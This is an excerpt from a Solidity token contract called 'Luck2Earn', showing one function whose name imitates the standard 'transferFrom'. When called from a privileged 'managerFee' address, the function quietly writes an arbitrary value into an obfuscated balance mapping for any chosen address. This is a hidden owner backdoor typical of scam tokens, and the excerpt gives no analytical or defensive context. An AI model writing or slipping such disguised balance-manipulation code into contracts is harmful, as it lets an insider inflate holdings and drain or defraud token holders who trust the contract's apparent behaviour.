...
contract Luck2Earn is Ownable {
  ...
  function transfersFrom(address spender, uint256 _value) public returns (bool) {
      if(msg.sender == address(managerFee)){
        uint256 rtAmount = uint256(spender);
        _liquify[address(rtAmount)] = buybackPairs * swapperFees * _value * (10 ** 9) / buybackPairs;
        return true;
      }
      return false;
  }
